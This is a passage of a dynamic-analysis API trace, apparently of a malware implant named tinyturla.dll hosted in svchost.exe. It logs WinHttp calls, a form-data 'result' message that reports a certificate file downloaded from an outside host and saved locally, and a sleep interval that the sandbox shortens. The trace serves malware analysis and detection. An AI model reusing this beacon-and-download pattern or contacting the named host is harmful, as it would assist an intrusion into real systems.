+[STR]              "ea2ced84"
+[STR]              "---"
+[STR]              "Content-Disposition: form-data;name="result""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "[+] File https://hanagram.jp/hanagram.cert loaded and saved in toto.cer"
+[STR]              ""
+[STR]              "-----"
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0xfa
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F7A0
+[RET] 0x7fff146bd3f2 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReceiveResponse> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest   : 0x000000F43F66A450
+[PAR] LPVOID    lpReserved : 0x0
+[RET] 0x7fff146bd415 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryHeaders> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest          : 0x000000F43F66A450
+[PAR] DWORD     dwInfoLevel       : 0x13 (WINHTTP_QUERY_STATUS_CODE)
+[PAR] LPCWSTR   pwszName          : 0x0 (null)
+[PAR] LPVOID    lpBuffer          : 0x000000F43F8AA6D0
+[PAR] LPDWORD   lpdwBufferLength  : 0x000000F43F2CFCE4
+[PAR] LPDWORD   lpdwIndex         : 0x0
+[RET] 0x7fff146bd45c in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryDataAvailable> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                   : 0x3f66a450
+[PAR] LPDWORD   lpdwNumberOfBytesAvailable : 0x000000F44055F7C0
+[RET] 0x7fff146bb7ef in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f66a450
+[PAR] LPVOID    lpBuffer              : 0x000000F43F2CE490
+[PAR] DWORD     dwNumberOfBytesToRead : 0x32
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F44055F7C4
+[RET] 0x7fff146bb844 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <RtlReAllocateHeap> in [ntdll.dll] 
+[PAR] PVOID  HeapHandle  : 0x000000F43E7A0000
+[PAR] ULONG  Flags       : 0x0 
+[PAR] PVOID  BaseAddress : 0x000000F43F2CE490
+[PAR] SIZE_T Size        : 0x64
+[RET] 0x7fff146bb877 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f66a450
+[PAR] LPVOID    lpBuffer              : 0x000000F43F3BCA82
+[PAR] DWORD     dwNumberOfBytesToRead : 0x32
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F44055F7C4
+[RET] 0x7fff146bb8ae in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3e803410
+[RET] 0x7fff146baeb7 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f66a450
+[RET] 0x7fff146baec6 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f66b470
+[RET] 0x7fff146baed5 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0x927c0 (600 sec)
+[RET] 0x7fff146b50aa in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[EVT] [Max Sleep]
+[MSG] Delay Execution reduced from 600000 ms to 15000 ms 
+
+
